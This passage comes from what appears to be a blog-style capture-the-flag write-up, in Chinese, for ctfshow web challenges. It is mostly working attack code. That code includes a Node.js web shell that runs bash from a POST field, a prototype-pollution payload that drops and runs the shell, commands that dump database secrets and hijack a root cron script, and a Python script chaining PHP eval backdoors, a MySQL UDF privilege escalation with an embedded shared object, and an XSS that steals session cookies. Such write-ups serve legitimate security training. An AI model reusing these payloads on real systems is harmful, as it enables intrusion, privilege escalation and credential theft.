class="string">&#x27;text/html; charset=utf8&#x27;</span>&#125;);</span><br><span class="line"> <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(body.<span class="property">cmd</span>) &#123;</span><br><span class="line">        res.<span class="title function_">write</span>(<span class="string">&quot;username：&quot;</span> + body.<span class="property">cmd</span>);</span><br><span class="line">        <span class="keyword">var</span> result= <span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;bash -c &quot;&#x27;</span>+body.<span class="property">cmd</span>+<span class="string">&#x27;&quot;&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        res.<span class="title function_">write</span>(result);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">write</span>(postHTML);</span><br><span class="line">    &#125;&#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;</span><br><span class="line">       res.<span class="title function_">write</span>(postHTML);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">end</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;).<span class="title function_">listen</span>(<span class="number">8033</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1=echo `curl -i -X POST -H \&#x27;Content-type\&#x27;:\&#x27;application/json\&#x27; -d \&quot;&#123;\\\&quot;__proto__\\\&quot;:&#123;\\\&quot;__proto__\\\&quot;: &#123;\\\&quot;type\\\&quot;:\\\&quot;Block\\\&quot;,\\\&quot;nodes\\\&quot;:\\\&quot;\\\&quot;,\\\&quot;compileDebug\\\&quot;:1,\\\&quot;self\\\&quot;:1,\\\&quot;line\\\&quot;:\\\&quot;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;echo YmFzaCAtYyAiZWNobyBkbUZ5SUdoMGRIQWdQU0J5WlhGMWFYSmxLQ2RvZEhSd0p5azdDblpoY2lCeGRXVnllWE4wY21sdVp5QTlJSEpsY1hWcGNtVW9KM0YxWlhKNWMzUnlhVzVuSnlrN0NncDJZWElnY0c5emRFaFVUVXdnUFNBbk1USXpKenNLSUFwb2RIUndMbU55WldGMFpWTmxjblpsY2lobWRXNWpkR2x2YmlBb2NtVnhMQ0J5WlhNcElIc0tJQ0IyWVhJZ1ltOWtlU0E5SUNJaU93b2dJSEpsY1M1dmJpZ25aR0YwWVNjc0lHWjFibU4wYVc5dUlDaGphSFZ1YXlrZ2V3b2dJQ0FnWW05a2VTQXJQU0JqYUhWdWF6c0tJQ0I5S1RzS0lDQnlaWEV1YjI0b0oyVnVaQ2NzSUdaMWJtTjBhVzl1SUNncElIc0tJQ0FnSUdKdlpIa2dQU0J4ZFdWeWVYTjBjbWx1Wnk1d1lYSnpaU2hpYjJSNUtUc0tJQ0FnSUhKbGN5NTNjbWwwWlVobFlXUW9NakF3TENCN0owTnZiblJsYm5RdFZIbHdaU2M2SUNkMFpYaDBMMmgwYld3N0lHTm9ZWEp6WlhROWRYUm1PQ2Q5S1RzS0lIUnllWHNLSUNBZ0lHbG1LR0p2WkhrdVkyMWtLU0I3Q2lBZ0lDQWdJQ0FnY21WekxuZHlhWFJsS0NKMWMyVnlibUZ0WmUrOG1pSWdLeUJpYjJSNUxtTnRaQ2s3Q2lBZ0lDQWdJQ0FnZG1GeUlISmxjM1ZzZEQwZ1oyeHZZbUZzTG5CeWIyTmxjM011YldGcGJrMXZaSFZzWlM1amIyNXpkSEoxWTNSdmNpNWZiRzloWkNnblkyaHBiR1JmY0hKdlkyVnpjeWNwTG1WNFpXTlRlVzVqS0NkaVlYTm9JQzFqSUNJbksySnZaSGt1WTIxa0t5Y2lKeWt1ZEc5VGRISnBibWNvS1RzS0lDQWdJQ0FnSUNCeVpYTXVkM0pwZEdVb2NtVnpkV3gwS1RzS0lDQWdJSDBnWld4elpTQjdDaUFnSUNBZ0lDQWdjbVZ6TG5keWFYUmxLSEJ2YzNSSVZFMU1LVHNLSUNBZ0lIMTlDaUFnSUNCallYUmphSHNLSUNBZ0lDQWdJSEpsY3k1M2NtbDBaU2h3YjNOMFNGUk5UQ2s3SUFvZ0lDQWdmUW9nSUNBZ2NtVnpMbVZ1WkNncE93b2dJSDBwT3dwOUtTNXNhWE4wWlc0b09EQXpNeWs3Q2c9PXxiYXNlNjQgLWQgPiAvaG9tZS9ub2RlL2FhLmpzO25vZGUgL2hvbWUvbm9kZS9hYS5qcyI=|base64 -d|bash\&#x27;)\\\&quot;&#125;&#125;&#125;\&quot; http://172.2.95.5:3000/login`;</span><br><span class="line"></span><br><span class="line">1=echo `curl -X POST -d &quot;cmd=mysql -uroot -proot -e &#x27;use ctfshow;select * from ctfshow_secret&#x27;&quot; http://172.2.95.5:8033`;</span><br></pre></td></tr></table></figure>

<h1 id="web669"><a href="#web669" class="headerlink" title="web669"></a>web669</h1><p>有个root的进程且普通用户可编辑，且定时执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=echo `curl -X POST -d &quot;cmd=ps -a&quot; http://172.2.141.5:8033`;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	sh /home/node/nodestartup.sh </span><br><span class="line">	<span class="built_in">sleep</span> 60</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=echo `curl -X POST -d &quot;cmd=rm -rf nodestartup.sh;echo &#x27;cat /root/* &gt; /home/node/1.txt &#x27; &gt; nodestartup.sh&quot; http://172.2.141.5:8033`;</span><br></pre></td></tr></table></figure>

<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">sess=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://1bc24237-9c92-4346-9f70-c6b15ce080f9.challenge.ctf.show/&quot;</span>   <span class="comment">#替换这里即可</span></span><br><span class="line"><span class="comment">#模拟数据备份,写入木马</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成木马</span></span><br><span class="line">sess.post(url+<span class="string">&quot;system36d/users.php?action=upload&quot;</span>,files=files)</span><br><span class="line">data1=&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;key_is_here_you_know&quot;</span>,<span class="string">&quot;file&quot;</span>:<span class="string">&quot;../db/data_you_never_know.db&quot;</span>,<span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/a.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);&quot;</span>&#125;</span><br><span class="line">sess.post(url+<span class="string">&#x27;system36d/util/common.php?k=flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;&#x27;</span>,data=data1)</span><br><span class="line"><span class="comment">#生成sql执行web界面</span></span><br><span class="line">data3=&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;key_is_here_you_know&quot;</span>,<span class="string">&quot;file&quot;</span>:<span class="string">&quot;../db/data_you_never_know.db&quot;</span>,<span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/sqltest.php&#x27;,&#x27;&lt;?php highlight_file(__FILE__);error_reporting(0);$mysqli = new mysqli(\&quot;localhost\&quot;,\&quot;root\&quot;,\&quot;root\&quot;,\&quot;ctfshow\&quot;);$tmp = $mysqli-&gt;query($_POST[\&quot;sql\&quot;]);$result = $tmp-&gt;fetch_all();print_r($result);?&gt;&#x27;);&quot;</span>&#125;</span><br><span class="line">sess.post(url+<span class="string">&quot;a.php&quot;</span>,data=data3)</span><br><span class="line"></span><br><span class="line"><span class="comment">#udf提权</span></span><br><span class="line">data2=&#123; <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;file_put_contents(\&#x27;udf.so\&#x27;,hex2bin(\&#x27;7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e8162000\&#x27;));&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;../db/data_you_never_know.db&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;key_is_here_you_know&#x27;</span>&#125;</span><br><span class="line">sess.post(url+<span class="string">&quot;a.php&quot;</span>,data=data2)</span><br><span class="line">data4=&#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&quot;shell_exec(&#x27;cp /var/www/html/udf.so /usr/lib/mariadb/plugin/udf.so&#x27;);&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;../db/data_you_never_know.db&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;key_is_here_you_know&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">sess.post(url+<span class="string">&quot;a.php&quot;</span>,data=data4)</span><br><span class="line">sess.post(url+<span class="string">&quot;a.php&quot;</span>,data=&#123;<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;`mysql -uroot -proot -e &quot;create function sys_eval returns string soname \&#x27;udf.so\&#x27;&quot;`;&#x27;</span>&#125;)</span><br><span class="line">cmd=<span class="string">&#x27;&#x27;&#x27;mysql -uroot -proot -e &quot;select sys_eval(&#x27;sudo cat /root/you_win&#x27;)&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line">cmd=base64.b64encode(cmd.encode()).decode()</span><br><span class="line">datax=&#123;<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;echo `echo &#123;0&#125;|base64 -d|sh`;&#x27;</span>.<span class="built_in">format</span>(cmd)&#125;</span><br><span class="line">r1=sess.post(url+<span class="string">&quot;a.php&quot;</span>,data=datax)</span><br><span class="line"><span class="built_in">print</span>(r1.text)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二阶段</span></span><br><span class="line"><span class="comment">#获取内网ip</span></span><br><span class="line">r1=sess.post(url+<span class="string">&quot;a.php&quot;</span>,data=&#123;<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;echo `cat /etc/hosts`;&#x27;</span>&#125;)</span><br><span class="line">ip1=re.findall(<span class="string">&#x27;(172.*?)web&#x27;</span>,r1.text,re.S)[<span class="number">0</span>].strip()</span><br><span class="line"><span class="comment"># print(ip1)</span></span><br><span class="line">ip2=re.sub(<span class="string">&quot;\.4$&quot;</span>,<span class="string">&#x27;.5&#x27;</span>,ip1)  <span class="comment">#另外一台服务器地址</span></span><br><span class="line"><span class="built_in">print</span>(ip2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#xss获取cookie</span></span><br><span class="line">sess.post(url+<span class="string">&#x27;a.php&#x27;</span>,data=&#123;<span class="string">&#x27;1&#x27;</span>:<span class="string">&quot;file_put_contents(&#x27;log.php&#x27;,&#x27;&lt;?php highlight_file(__FILE__);$parameter = $_SERVER[\&quot;QUERY_STRING\&quot;].$_SERVER[\&quot;HTTP_COOKIE\&quot;];file_put_contents(\&quot;log.txt\&quot;,$parameter);&#x27;);?&gt;&quot;</span>&#125;)</span><br><span class="line">u=<span class="string">&quot;http://&#123;0&#125;/log.php?s=&quot;</span>.<span class="built_in">format</span>(ip1)</span><br><span class="line">a=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> u:</span><br><span class="line">    a=a+<span class="built_in">str</span>(<span class="built_in">ord</span>(i))+<span class="string">&#x27;,&#x27;</span></span><br><span class="line">a=re.sub(<span class="string">&quot;,$&quot;</span>,<span class="string">&#x27;&#x27;</span>,a)</span><br><span class="line">sess.post(url+<span class="string">&quot;a.php&quot;</span>,data=&#123;<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;`curl --header &quot;X-Forwarded-For:&lt;script&gt;window.location.href=String.fromCharCode(&#123;0&#125;)+document.cookie;&lt;/script&gt;&quot; http://&#123;1&#125;/index.php?action=login\&amp;u=0002\&amp;p=345`;&#x27;</span>.<span class="built_in">format</span>(a,ip2)&#125;)</span><br><span class="line"><span class="comment">## 隔上一两分钟访问log.txt就能拿到cookie和auth</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        log=sess.get(url+<span class="string">&#x27;log.txt&#x27;</span>).text</span><br><span class="line">        phpsessid=re.findall(<span class="string">&quot;(PHPSESSID=.*?);%20&quot;</span>,log)[<span class="number">0</span>]</span><br><span class="line">        auth=re.findall(<span class="string">&quot;(auth=.*)&quot;</span>,log)[<span class="number">0</span>]</span><br><span class="line">        <span 